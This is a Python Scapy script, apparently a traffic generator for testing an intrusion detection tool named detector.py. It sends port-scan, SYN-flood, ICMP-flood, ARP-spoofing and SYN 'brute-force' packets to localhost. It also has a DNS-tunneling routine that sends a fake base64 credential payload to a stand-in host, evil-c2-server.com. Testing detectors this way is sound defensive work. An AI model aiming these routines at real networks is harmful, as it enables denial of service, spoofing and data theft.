from scapy.all import IP, TCP, UDP, ICMP, ARP, DNS, DNSQR, Ether, send, sendp
import time

# ──────────────────────────────────────────
# CONFIGURATION
# ──────────────────────────────────────────
TARGET_IP  = "127.0.0.1"   # attacking ourselves (safe!)
OUR_MAC    = "aa:bb:cc:dd:ee:ff"  # fake MAC for ARP test
FAKE_MAC   = "11:22:33:44:55:66"  # second fake MAC for ARP spoof

# ──────────────────────────────────────────
# ATTACK #1 — PORT SCAN
# Probe 15 different ports quickly
# ──────────────────────────────────────────
def attack_port_scan():
    print("\n[*] Simulating PORT SCAN...")
    for port in range(1, 16):
        send(IP(dst=TARGET_IP)/TCP(dport=port, flags="S"), verbose=0)
        time.sleep(0.05)
    print("[+] Port scan done!")

# ──────────────────────────────────────────
# ATTACK #2 — SYN FLOOD
# Send 110 SYN packets to port 80
# ──────────────────────────────────────────
def attack_syn_flood():
    print("\n[*] Simulating SYN FLOOD...")
    for i in range(110):
        send(IP(dst=TARGET_IP)/TCP(dport=80, flags="S"), verbose=0)
    print("[+] SYN flood done!")

# ──────────────────────────────────────────
# ATTACK #3 — ICMP FLOOD
# Send 60 ping packets
# ──────────────────────────────────────────
def attack_icmp_flood():
    print("\n[*] Simulating ICMP FLOOD...")
    for i in range(60):
        send(IP(dst=TARGET_IP)/ICMP(), verbose=0)
    print("[+] ICMP flood done!")

# ──────────────────────────────────────────
# ATTACK #4 — SSH BRUTE FORCE
# Hammer port 22 with SYN packets
# ──────────────────────────────────────────
def attack_ssh_brute():
    print("\n[*] Simulating SSH BRUTE FORCE...")
    for i in range(10):
        send(IP(dst=TARGET_IP)/TCP(dport=22, flags="S"), verbose=0)
        time.sleep(0.1)
    print("[+] SSH brute force done!")

# ──────────────────────────────────────────
# ATTACK #5 — HTTP BRUTE FORCE
# Hammer port 80 repeatedly
# ──────────────────────────────────────────
def attack_http_brute():
    print("\n[*] Simulating HTTP BRUTE FORCE...")
    for i in range(25):
        send(IP(dst=TARGET_IP)/TCP(dport=80, flags="S"), verbose=0)
        time.sleep(0.05)
    print("[+] HTTP brute force done!")

# ──────────────────────────────────────────
# ATTACK #6 — ARP SPOOFING
# Same IP claiming two different MAC addresses
# ──────────────────────────────────────────
def attack_arp_spoof():
    print("\n[*] Simulating ARP SPOOFING...")
    # First ARP reply — legit MAC
    pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=OUR_MAC) / \
           ARP(op=2, psrc=TARGET_IP, hwsrc=OUR_MAC,
               pdst=TARGET_IP, hwdst="ff:ff:ff:ff:ff:ff")
    # Second ARP reply — fake MAC (this is the spoof!)
    pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff", src=FAKE_MAC) / \
           ARP(op=2, psrc=TARGET_IP, hwsrc=FAKE_MAC,
               pdst=TARGET_IP, hwdst="ff:ff:ff:ff:ff:ff")
    for i in range(5):
        sendp(pkt1, verbose=0)
        sendp(pkt2, verbose=0)
        time.sleep(0.2)
    print("[+] ARP spoof done!")

# ──────────────────────────────────────────
# ATTACK #7 — DNS TUNNELING
# Encode fake "stolen data" in a long DNS query
# ──────────────────────────────────────────
def attack_dns_tunnel():
    print("\n[*] Simulating DNS TUNNELING...")
    # Simulate encoded exfiltration payload in DNS name
    stolen_data = "dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9c2VjcmV0MTIz"  # base64-like fake payload
    payload = stolen_data + ".evil-c2-server.com"
    for i in range(3):
        send(IP(dst="8.8.8.8") /
             UDP(dport=53) /
             DNS(rd=1, qd=DNSQR(qname=payload)),
             verbose=0)
        time.sleep(0.3)
    print("[+] DNS tunnel done!")

# ──────────────────────────────────────────
# MAIN — Run all attacks in sequence
# ──────────────────────────────────────────
def main():
    print("=" * 50)
    print("   IDS ATTACK SIMULATOR — All 7 Attacks")
    print("=" * 50)
    print("[!] Make sure detector.py is running first!\n")
    input("Press ENTER to start simulating attacks...")

    attack_port_scan()
    time.sleep(1)

    attack_syn_flood()
    time.sleep(1)

    attack_icmp_flood()
    time.sleep(1)

    attack_ssh_brute()
    time.sleep(1)

    attack_http_brute()
    time.sleep(1)

    attack_arp_spoof()
    time.sleep(1)

    attack_dns_tunnel()

    print("\n" + "=" * 50)
    print("[+] All 7 attacks simulated!")
    print("[+] Check your detector.py terminal for alerts!")
    print("=" * 50)

if __name__ == "__main__":
    main()
